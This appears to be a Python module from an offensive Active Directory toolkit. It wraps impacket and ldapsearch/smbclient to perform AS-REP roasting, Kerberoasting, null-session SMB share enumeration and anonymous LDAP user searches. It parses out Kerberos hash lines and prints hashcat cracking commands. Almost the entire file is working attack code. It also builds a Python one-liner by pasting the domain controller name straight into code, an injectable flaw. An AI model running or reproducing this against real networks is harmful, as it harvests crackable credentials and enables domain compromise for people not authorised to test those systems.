"""AD enumeration — real protocol attacks via impacket CLI tools.

v5.2: ad_null_session was a port-knock (TCP connect + byte count).
Now: real AS-REP roasting (GetNPUsers), Kerberoasting (GetUserSPNs),
SMB share enumeration, and LDAP user search — each a genuine impacket
subprocess invocation with parsed output. Null-session check retained
as the cheap first step.
"""

import re
import subprocess

_TIMEOUT = 60


def _run(argv, timeout=_TIMEOUT):
    """Run a subprocess, return (stdout, stderr, returncode)."""
    try:
        r = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        return r.stdout or "", r.stderr or "", r.returncode
    except FileNotFoundError:
        return "", f"not installed: {argv[0]}", -1
    except subprocess.TimeoutExpired:
        return "", f"timed out ({timeout}s)", -1


def ad_null_session(dc: str = "") -> str:
    """Quick check: is the DC's LDAP port open?"""
    if not dc:
        return "Error: dc required"
    argv = [
        "python3",
        "-c",
        f"import socket;s=socket.create_connection(('{dc.strip()}',389),5);s.close();print('LDAP_OPEN')",
    ]
    out, err, rc = _run(argv, timeout=10)
    if "LDAP_OPEN" in out:
        return f"LDAP 389 open on {dc} — run ad_asrep_roast and ad_smb_shares next"
    return f"LDAP 389 closed/unreachable on {dc} ({err.strip()[:80] or 'no banner'})"


def ad_asrep_roast(dc: str = "", users: str = "") -> str:
    """AS-REP roasting: find accounts with Kerberos pre-auth disabled.

    Equivalent: GetNPUsers.py domain/ -no-pass -usersfile <users>
    Returns hash lines crackable offline (hashcat -m 18200)."""
    if not dc:
        return "Error: dc required (format: domain.com or user@domain.com)"
    argv = ["GetNPUsers.py", dc.strip(), "-no-pass", "-format", "hashcat"]
    if users:
        argv += ["-usersfile", users.strip()]
    out, err, rc = _run(argv)
    if rc == -1 and "not installed" in err:
        return "Error: impacket not installed (pip install impacket)"
    if rc != 0:
        hint = "check: DC reachable? user list valid? credentials valid?"
        return f"Error: GetNPUsers rc={rc}: {err.strip()[:150]} ({hint})"
    # extract hash lines ($krb5asrep$...)
    hashes = [ln for ln in out.splitlines() if "$krb5asrep$" in ln]
    if hashes:
        return (
            f"AS-REP roastable accounts ({len(hashes)}):\n"
            + "\n".join(hashes[:10])
            + "\ncrack: hashcat -m 18200 hashes.txt wordlist.txt"
        )
    return f"No AS-REP roastable accounts found (output: {out.strip()[:150]})"


def ad_kerberoast(dc: str = "", user: str = "", password: str = "") -> str:
    """Kerberoasting: request SPN tickets crackable offline.

    Equivalent: GetUserSPNs.py domain/user:password -dc-ip <dc> -request"""
    if not dc or not user:
        return "Error: dc and user required (user format: DOMAIN\\\\username)"
    argv = ["GetUserSPNs.py", f"{user.strip()}:{password or ''}", "-request"]
    out, err, rc = _run(argv)
    if rc == -1 and "not installed" in err:
        return "Error: impacket not installed (pip install impacket)"
    if rc != 0:
        return f"Error: GetUserSPNs rc={rc}: {err.strip()[:150]}"
    spns = [ln for ln in out.splitlines() if "SPN" in ln or "$krb5tgs$" in ln]
    hashes = [ln for ln in out.splitlines() if "$krb5tgs$" in ln]
    if hashes:
        return (
            f"Kerberoastable SPNs ({len(hashes)} tickets):\n"
            + "\n".join(spns[:5])
            + "\n"
            + "\n".join(hashes[:5])
            + "\ncrack: hashcat -m 13100 tickets.txt wordlist.txt"
        )
    if spns:
        return f"SPN accounts found ({len(spns)}):\n" + "\n".join(spns[:10])
    return f"No SPN tickets retrieved (output: {out.strip()[:150]})"


def ad_smb_shares(host: str = "") -> str:
    """Enumerate SMB shares on a host (null session or authenticated).

    Equivalent: impacket-smbclient -list //host -no-pass (or with creds)
    Also tries net view as fallback."""
    if not host:
        return "Error: host required"
    # try impacket first
    argv = ["impacket-smbclient", "-list", f"//{host.strip()}", "-no-pass"]
    out, err, rc = _run(argv)
    if rc == 0 and out.strip():
        shares = [ln.strip() for ln in out.splitlines() if ln.strip() and not ln.startswith("=")]
        return f"SMB shares on {host} ({len(shares)}):\n" + "\n".join(shares[:15])
    # fallback: smbclient -L
    argv2 = ["smbclient", "-L", f"//{host.strip()}", "-N"]
    out2, err2, rc2 = _run(argv2)
    if rc2 == 0 and out2.strip():
        shares = [ln.strip() for ln in out2.splitlines() if "Disk" in ln or "Printer" in ln or "IPC" in ln]
        return f"SMB shares on {host} ({len(shares)}):\n" + "\n".join(shares[:15])
    if rc == -1 and "not installed" in err:
        return "Error: neither impacket-smbclient nor smbclient installed"
    return f"Error: SMB enumeration failed (impacket: {err.strip()[:80]}; smbclient: {err2.strip()[:80]})"


def ad_ldap_search(dc: str = "", query: str = "(objectClass=user)", attrs: str = "") -> str:
    """LDAP search against a DC (anonymous or simple bind).

    Equivalent: ldapsearch -x -H ldap://dc -b dc=domain,dc=com <query>"""
    if not dc:
        return "Error: dc required"
    # derive base DN from the dc hostname or domain
    domain_parts = dc.strip().split(".")
    if len(domain_parts) > 1:
        base_dn = ",".join(f"dc={p}" for p in domain_parts)
    else:
        base_dn = dc.strip()
    argv = ["ldapsearch", "-x", "-H", f"ldap://{dc.strip()}", "-b", base_dn, query.strip()]
    if attrs:
        argv += attrs.strip().split()
    out, err, rc = _run(argv)
    if rc == -1 and "not installed" in err:
        return "Error: ldapsearch not installed (apt install ldap-utils / brew install openldap)"
    if rc != 0:
        return f"Error: ldapsearch rc={rc}: {err.strip()[:120]}"
    # count entries + extract DNs
    count = out.count("dn:")
    dns = [ln.replace("dn: ", "").strip() for ln in out.splitlines() if ln.startswith("dn:")]
    return f"LDAP search '{query}': {count} entries\n" + "\n".join(dns[:20])


def ad_full(dc: str = "", user: str = "", password: str = "") -> str:
    """Full AD recon: null-session + AS-REP + SMB + LDAP."""
    out = []
    out.append("== LDAP PORT ==")
    out.append(ad_null_session(dc))
    out.append("\n== AS-REP ROAST ==")
    out.append(ad_asrep_roast(dc if "@" in dc else dc))
    out.append("\n== SMB SHARES ==")
    out.append(ad_smb_shares(dc.split("/")[0] if "/" in dc else dc))
    out.append("\n== LDAP SEARCH ==")
    out.append(ad_ldap_search(dc))
    if user:
        out.append("\n== KERBEROAST ==")
        out.append(ad_kerberoast(dc, user, password))
    return "\n".join(out)
